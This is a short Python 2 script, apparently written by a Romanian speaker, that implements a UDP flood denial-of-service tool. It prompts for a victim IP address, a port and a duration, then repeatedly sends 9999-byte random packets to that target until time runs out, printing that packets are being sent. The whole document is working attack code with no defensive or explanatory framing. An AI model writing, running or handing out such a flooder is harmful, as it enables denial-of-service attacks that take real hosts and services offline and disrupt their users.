import time 
import socket 
import random 

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
bytes = random._urandom(9999)  

victim = raw_input("Ip:") 
vport = input("Port:") 
duration = input("Timp:") 
timeout = time.time() + duration 
sent = 0 
while 1: 
	if time.time() > timeout: 
		break 
	else: 
		pass 

	client.sendto(bytes, (victim, vport)) 
	sent = sent + 1
	print("Pachetele se trimit")  
